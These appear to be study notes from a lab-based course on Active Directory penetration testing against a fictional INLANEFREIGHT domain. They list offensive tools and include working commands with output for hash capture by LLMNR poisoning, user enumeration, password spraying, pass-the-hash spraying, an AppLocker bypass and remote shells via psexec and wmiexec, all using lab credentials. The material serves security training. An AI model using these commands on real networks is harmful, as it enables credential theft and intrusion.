# Active Directory Enumeration and Attacks

## ACTIVE DIRECTORY Enum & Attacks

[https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg)

AD method

#### **In Scope For Assessment**

| Range/Domain                  | Description                                                                               |
| ----------------------------- | ----------------------------------------------------------------------------------------- |
| INLANEFREIGHT.LOCAL           | Customer domain to include AD and web services.                                           |
| LOGISTICS.INLANEFREIGHT.LOCAL | Customer subdomain                                                                        |
| FREIGHTLOGISTICS.LOCAL        | Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL |
| 172.16.5.0/23                 | In-scope internal subnet.                                                                 |

## **Tools of the Trade**

| Tool                                                                                                                | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1/https://github.com/dmchell/SharpView | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net\* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
| https://github.com/BloodHoundAD/BloodHound                                                                          | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a https://neo4j.com/ database for graphical analysis of the AD environment.                                                                                                                                                                                                                   |
| https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors                                                   | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.                                                                                                                                                                                                                                                                                                      |
| https://github.com/fox-it/BloodHound.py                                                                             | A Python-based BloodHound ingestor based on the https://github.com/CoreSecurity/impacket/. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.                                                                                                                                                                                                                                                                                                                                         |
| https://github.com/ropnop/kerbrute                                                                                  | A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| https://github.com/SecureAuthCorp/impacket                                                                          | A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.                                                                                                                                                                                                                                                                                                                                                                                                                             |
| https://github.com/lgandx/Responder                                                                                 | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1                                                  | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh                                                      | The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo                            | The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.                                                                                                                                                            |
| https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html                                                  | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| https://github.com/byt3bl33d3r/CrackMapExec                                                                         | CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.                                                                                                                                                                                                                                                                                                                                 |
| https://github.com/GhostPack/Rubeus                                                                                 | Rubeus is a C# tool built for Kerberos Abuse.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py                                      | Another Impacket module geared towards finding Service Principal names tied to normal users.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| https://hashcat.net/hashcat/                                                                                        | A great hash cracking and password recovery tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| https://github.com/CiscoCXSecurity/enum4linux                                                                       | A tool for enumerating information from Windows and Samba systems.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| https://github.com/cddmp/enum4linux-ng                                                                              | A rework of the original Enum4linux tool that works a bit differently.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| https://linux.die.net/man/1/ldapsearch                                                                              | Built-in interface for interacting with the LDAP protocol.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| https://github.com/ropnop/windapsearch                                                                              | A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| https://github.com/dafthack/DomainPasswordSpray                                                                     | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| https://github.com/leoloobeek/LAPSToolkit                                                                           | The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).                                                                                                                                                                                                                                                                                                                                                                                             |
| https://github.com/ShawnDEvans/smbmap                                                                               | SMB share enumeration across a domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py                                           | Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py                                          | Part of the Impacket toolkit, it provides the capability of command execution over WMI.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| https://github.com/SnaffCon/Snaffler                                                                                | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py                                        | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11) | Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| https://github.com/ParrotSec/mimikatz                                                                               | Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py                                      | Remotely dump SAM and LSA secrets from a host.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| https://github.com/Hackplayers/evil-winrm                                                                           | Provides us with an interactive shell on a host over the WinRM protocol.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py                                      | Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| https://github.com/Ridter/noPac                                                                                     | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py                                          | Part of the Impacket toolset, RPC endpoint mapper.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py                                                 | Printnightmare PoC in python.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py                                       | Part of the Impacket toolset, it performs SMB relay attacks.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| https://github.com/topotam/PetitPotam                                                                               | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py                                                 | Tool for manipulating certificates and TGTs.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py                                                    | This tool will use an existing TGT to request a PAC for the current user using U2U.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| https://github.com/dirkjanm/adidnsdump                                                                              | A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| https://github.com/t0thkr1s/gpp-decrypt                                                                             | Extracts usernames and passwords from Group Policy preferences files.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py                                       | Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.                                                                                                                                                                                                                                                                                                                            |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py                                        | SID bruteforcing tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py                                         | A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py                                       | Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer                                                  | Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.                                                                                                                                                  |
| https://www.pingcastle.com/documentation/                                                                           | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on https://en.wikipedia.org/wiki/Capability\_Maturity\_Model\_Integration adapted to AD security).                                                                                                                                                                                                                                                                                                                                                                                   |
| https://github.com/Group3r/Group3r                                                                                  | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| https://github.com/adrecon/ADRecon                                                                                  | A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.                                                                                                                                                                                                                                                                                                                                                             |

## **Initial Enumeration**

### **External Recon and Enumeration Principles**

* [https://bgp.he.net/](https://bgp.he.net/) for **Finding Address Spaces**
* [https://whois.domaintools.com/](https://whois.domaintools.com/)
* [https://viewdns.info/](https://viewdns.info/)

### **Initial Enumeration of the Domain**

* Running wireshark or tcp dump to see what hosts and types of network traffic we can capture. we can look for `arp` and `mdns` or other layer 2 packets.
* Then using Responder tool to analyze network traffic and determine if anything else in the domain pops up. `sudo responder -I ens224 -A`
* [https://fping.org/](https://fping.org/) ICMP sweep of the subnet using `fping`.

| Command                                                                                             | Description                                                                                                                                                                                                                                                                                         |
| --------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| nslookup ns1.inlanefreight.com                                                                      | Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.                                                                                                                                                              |
| sudo tcpdump -i ens224                                                                              | Used to start capturing network packets on the network interface proceeding the -i option a Linux-based host.                                                                                                                                                                                       |
| sudo responder -I ens224 -A                                                                         | Used to start responding to & analyzing LLMNR, NBT-NS and MDNS queries on the interface specified proceeding the -I option and operating in Passive Analysis mode which is activated using -A. Performed from a Linux-based host                                                                    |
| fping -asgq 172.16.5.0/23                                                                           | Performs a ping sweep on the specified network segment from a Linux-based host.                                                                                                                                                                                                                     |
| sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum                                    | Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (-A) based on a list of hosts (hosts.txt) specified in the file proceeding -iL. Then outputs the scan results to the file specified after the -oNoption. Performed from a Linux-based host |
| sudo git clone https://github.com/ropnop/kerbrute.git                                               | Uses git to clone the kerbrute tool from a Linux-based host.                                                                                                                                                                                                                                        |
| make help                                                                                           | Used to list compiling options that are possible with make from a Linux-based host.                                                                                                                                                                                                                 |
| sudo make all                                                                                       | Used to compile a Kerbrute binary for multiple OS platforms and CPU architectures.                                                                                                                                                                                                                  |
| ./kerbrute\_linux\_amd64                                                                            | Used to test the chosen complied Kebrute binary from a Linux-based host.                                                                                                                                                                                                                            |
| sudo mv kerbrute\_linux\_amd64 /usr/local/bin/kerbrute                                              | Used to move the Kerbrute binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool.                                                                                                                                                                          |
| ./kerbrute\_linux\_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results | Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.             |

## **Sniffing out a Foothold**

### LLMNR/NBT-NS Poisoning From Linux

`LLMNR` is a protocol used to identify hosts when DNS fails to do so. Previously known as `NBT-NS`

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled.png>)

in last step when victim connects to us it sends us its `username` and `NTLM` hash. Which we will intercept using responder.

In short

1. A host attempts to connect to the print server at \print01.inlanefreight.local, but accidentally types in \printer01.inlanefreight.local.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of \printer01.inlanefreight.local.
4. The attacker (us with `Responder` running) responds to the host stating that it is the \printer01.inlanefreight.local that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.

RUN RESPONDER

*   `sudo responder -I {interface}` → run responder

    ![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 1.png>)

    Responder will capture hash

    copy the whole hash and crack the hash if possible.

    ## In windows we will use [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

    If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder, but is written in PowerShell and C#.
* `PS C:\htb> Import-Module .\Inveigh.ps1` → importing module.
*   `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` → starting inveigh with llmnr and NBNS spoofing and output to the console and write to a file.

    ### **`C# Inveigh (InveighZero)`**

    Powershell version is no longer updated, C# version is maintained update by the authors.
*   `PS C:\htb> .\Inveigh.exe` → run the c# version, which will start capturing the hash.

    We can hit the `esc` key to enter the console while Inveigh is running.

    After typing `HELP` and hitting enter, we are presented with several options:

    We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.

    We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected.

## **Sighting In, Hunting For A User**

### **Enumerating & Retrieving Password Policies**

### **Enumerating & Retrieving - from Linux - Credentialed ⭐**

With valid domain credentials, password policy can be obtained remotely using tools like `crackmapexec` or `rpcclient`

```
dollarboysushil@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-polSMB

         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Dumping password info for domain: INLANEFREIGHT
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password length: 8
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password history length: 24
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Maximum password age: Not Set
SMB         172.16.5.5      445    ACADEMY-EA-DC01
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password Complexity Flags: 000001
SMB         172.16.5.5      445    ACADEMY-EA-DC01  	Domain Refuse Password Change: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  	Domain Password Store Cleartext: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  	Domain Password Lockout Admins: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  	Domain Password No Clear Change: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  	Domain Password No Anon Change: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  	Domain Password Complex: 1
```

### **Enumerating the Password Policy - from Linux - SMB NULL Sessions ⭐**

Without valid credentials, we can get password policy using SMB NULL sessions

SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.

* `rpcclient -U "" -N 172.16.5.5`
* then run rpc command such as `querydominfo` to confirm NULL sessions access
* then rpc command`getdompwinfo` gives us the password policy.

#### Using [enum4linux](https://labs.portcullis.co.uk/tools/enum4linux) ⭐

* `enum4linux -P 172.16.5.5` -p flag specifies for password policy

#### Using [enum4linux](https://github.com/cddmp/enum4linux-ng)-ng

* `enum4linux-ng -P 172.16.5.5 -oA ilfreight` → enum4linux-ng is rewrite of enum4linux in python with additional features like export.

### **Enumerating Null Session - from Windows**

uncommon to do null session attack from windows.

* `C:\htb> net use \\DC01\ipc$ "" /u:""` → establishing null sessions

### **Enumerating the Password Policy - from Linux - LDAP Anonymous Bind**

#### **Using ldapsearch**

* `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength`

### **Enumerating the Password Policy - from Windows ⭐**

If we are authenticated to the domain from a windows host, we can use `net.exe` to retrieve the password policy.

```
C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```

### Password Spraying - Making a Target User List

1️⃣ \*\*SMB NULL Session to Pull User List\*\*

#### **Using enum4linux**

* `enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`

#### **Using rpcclient**

```
dollarboysushil@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
rpcclient$> enumdomusers
```

#### **Using CrackMapExec --users Flag**

* `crackmapexec smb 172.16.5.5 --users`

2️⃣ \*\*Gathering Users with LDAP Anonymous\*\*

#### **Using ldapsearch**

* `dollarboysushil@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "`

it is easier to use windapsearch

#### **Using windapsearch**

* `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`

3️⃣ \*\*Enumerating Users with Kerbrute ⭐\*\*

if we have no access at all from our position in the internal network, we can use `Kerbrute` to enumerate valid AD accounts and for password spraying. this tool uses Kerberos Per-Authentication, which is much faster and stealthier

this method does not generate Windows event ID or logon failure.

The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error `PRINCIPAL UNKNOWN`, the username is invalid.

* `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`

4️⃣ \*\*Credentialed Enumeration to Build our User List\*\*

Once we get valid credential, we can use various tools to build get the user from AD

* `sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users` → this will give the list of users

## **Spray Responsibly**

### **Internal Password Spraying - from Linux**

1️⃣ \*\*Using Kerbrute for the Attack ⭐\*\*

```
dollarboysushil@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

2️⃣ \*\*Using CrackMapExec & Filtering Logon Failures ⭐\*\*

```
dollarboysushil@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

After getting correct credential from above method, we can validate the credentials using crackmapexec

```
dollarboysushil@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

3️⃣ \*\*Local Admin Spraying with CrackMapExec\*\*

```
dollarboysushil@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

&#x20;The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout

### **Internal Password Spraying - from Windows**

1️⃣ \*\*Using DomainPasswordSpray.ps1\*\*

```powershell
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

## **Deeper Down the Rabbit Hole**

* `PS C:\htb> Get-MpComputerStatus`→ check the status of windows defender
*   Applocker is Microsoft’s application whitelisting solution. Using Applocker, organization blocks cmd.exe, powershell.exe etc.

    we can bypass this, lets say `Powershell.exe` is blocked, then we use powershell’s other executable locations such as;

    `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.&#x20;
* `PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

## **LAPS** `Local Administrator Password Solution`

* is used to randomize and rotate local administrator passwords on windows hosts and prevent lateral movement.

| Command                                     | Description                                                                                                                                                                              |
| ------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Get-MpComputerStatus                        | PowerShell cmd-let used to check the status of Windows Defender Anti-Virus from a Windows-based host.                                                                                    |
| Get-AppLockerPolicy -Effective              | select -ExpandProperty RuleCollections                                                                                                                                                   |
| $ExecutionContext.SessionState.LanguageMode | PowerShell script used to discover the PowerShell Language Mode being used on a Windows-based host. Performed from a Windows-based host.                                                 |
| Find-LAPSDelegatedGroups                    | A LAPSToolkit function that discovers LAPS Delegated Groups from a Windows-based host.                                                                                                   |
| Find-AdmPwdExtendedRights                   | A LAPSTookit function that checks the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights. Performed from a Windows-based host. |
| Get-LAPSComputers                           | A LAPSToolkit function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.      |

## **Credentialed Enumeration - from Linux**

1️⃣ \*\*CrackMapExec\*\*

*   `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users` → Domain user Enumeration

    Gives the list of users in domain with attribute `badPwdCount`
*   `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups` → Domain Group Enumeration

    gives us list of groups with number of users in each.
* `sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users` → lists what users are logged in currently.
* `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares` → enumerate available shares on the remote host and the level of access our user account has to each share
*   `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus`

    This will dig through each readable share on the host and list all readable file, we can also give specific share to spider e.g. `--share 'Department Shares'`

    output is located at `/tmp/cme_spider_plus/<ip of host>`

2️⃣ \*\*SMBMap\*\*

* `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5` → this will tell us what our user can access and their permission levels.
*   `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only`

    it will show you the output of all subdirectories within the higher-level directories.

    &#x20;`--dir-only` provided only the output of all directories and did not list all files.

3️⃣ \*\*rpcclient\*\*

[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD.&#x20;

* `rpcclient -U "" -N 172.16.5.5` → gives us null session shell on our DC using ms-rpc
*   `rpcclient **$**> queryuser 0x457` → user enumeration by RID, here hex 0x457 equals to decimal 111

    This will give info about user having RID 0x457 or decimal 111
* `rpcclient$> enumdomusers` → this will list all users along with their RID.

4️⃣ \*\*Impacket Toolkit\*\*

### Psexec.py

The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.

* `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125` → gives us shell

### **wmiexec.py**

Wmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules.&#x20;

* `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5` → gives us shell

5️⃣ \*\*Windapsearch\*\*

[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries.

*   `python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da` → gives users from domain admin group

    `--da` = enumerate domain admins group members
*   `python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU` → check for users with elevated privileges

    `-PU` = find privileged users

6️⃣ \*\*Bloodhound.py\*\*

It was initially only released with a PowerShell collector, so it had to be run from a Windows host. Eventually, a Python port (which requires Impacket, `ldap3`, and `dnspython`) was released by a community member. This helped immensely during penetration tests when we have valid domain credentials, but do not have rights to access a domain-joined Windows host or do not have a Windows attack host to run the SharpHound collector from. This also helps us not have to run the collector from a domain host, which could potentially be blocked or set off alerts (though even running it from our attack host will most likely set off alarms in well-protected environments).

*   `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` → executing bloodhound.py

    `-ns` = nameserver

    `-d` = domain

